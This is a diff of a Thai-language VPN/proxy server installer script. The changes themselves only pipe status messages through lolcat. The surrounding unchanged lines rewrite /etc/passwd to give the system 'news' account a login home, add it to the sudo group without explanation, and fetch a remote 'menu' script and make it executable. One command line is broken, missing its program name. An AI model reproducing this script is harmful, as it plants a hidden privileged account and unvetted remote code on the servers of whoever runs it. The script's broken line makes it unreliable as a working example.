@@ -42,17 +42,17 @@ fi
 echo "$SERVER_IP" > /usr/bin/ipsm
 
 # Install openvpn
-die "❯❯❯ apt-get update"
+die "❯❯❯ apt-get update"|lolcat
 apt-get update -q > /dev/null 2>&1
 
 
 
 #speedtestU.20
-die "❯❯❯ install speedtest U.20"
+die "❯❯❯ install speedtest U.20"|lolcat
  -q > /dev/null 2>&1
 
 
-die "❯❯❯ apt-get install squid3"
+die "❯❯❯ apt-get install squid3"|lolcat
 #Add Trusty Sources
 touch /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1
 echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1
@@ -60,7 +60,7 @@ echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee 
 
 
 
-#die "❯❯❯ apt-get install sudo"
+#die "❯❯❯ apt-get install sudo"|lolcat
 #apt-get install -qy sudo > /dev/null 2>&1
 
 sed -i 's/news:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin/news:x:9:9:news:\/home:/g' /etc/passwd
@@ -69,7 +69,7 @@ usermod -aG sudo news
 
 
 # install vnstat gui
-ok "❯❯❯ apt-get install vnstat"
+ok "❯❯❯ apt-get install vnstat"|lolcat
 apt-get install -qy vnstat > /dev/null 2>&1
 chown -R vnstat:vnstat /var/lib/vnstat
 wget -q https://github.com/LiLGun-X/HYPER-X-SCRIPT/raw/main/%C9%AA%C9%B4s%E1%B4%9B%E1%B4%80%CA%9F%CA%9F/vnstat_php_frontend-1.5.1.tar.gz
@@ -85,12 +85,12 @@ sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
  
 
  
-ok "❯❯❯ service vnstat restart"
+ok "❯❯❯ service vnstat restart"|lolcat
 service vnstat restart -q > /dev/null 2>&1
 
 
 # install dropbear
-die "❯❯❯ apt-get install dropbear"
+die "❯❯❯ apt-get install dropbear"|lolcat
 apt-get install -qy dropbear > /dev/null 2>&1
 sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=446/g' /etc/default/dropbear
@@ -102,7 +102,7 @@ service dropbear restart > /dev/null 2>&1
 
 
 # Iptables
-die "❯❯❯ apt-get install iptables"
+die "❯❯❯ apt-get install iptables"|lolcat
 apt-get install -qy iptables > /dev/null 2>&1
 if [ -e '/var/lib/vnstat/eth0' ]; then
 iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
@@ -137,7 +137,7 @@ sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
 service ssh restart
 
-ok "❯❯❯ กำลังติดตั้งเมนู " 
+ok "❯❯❯ กำลังติดตั้งเมนู "|lolcat 
 cd
 wget -q -O menu "https://raw.githubusercontent.com/LiLGun-X/D-script-1.0/master/menu.sh"
 chmod +x menu
